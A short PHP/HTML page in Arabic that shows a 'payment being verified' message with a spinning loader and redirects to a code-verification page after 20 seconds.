<?php
session_start();
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>جاري معالجة الدفع</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Tajawal', sans-serif;
      background-color: #f9f9f9;
      text-align: center;
      padding: 50px;
    }
    .loader {
      border: 12px solid #f3f3f3;
      border-top: 12px solid #1a6d3c;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin: 30px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h2 {
      color: #1a6d3c;
    }
  </style>
  <script>
    // الانتقال بعد 20 ثانية
    setTimeout(function() {
      window.location.href = 'verify-code.php';
    }, 20000);
  </script>
</head>
<body>
  <h2>جاري التحقق من الدفع...</h2>
  <div class="loader"></div>
  <p>يرجى الانتظار، لا تقم بإغلاق الصفحة</p>
</body>
</html>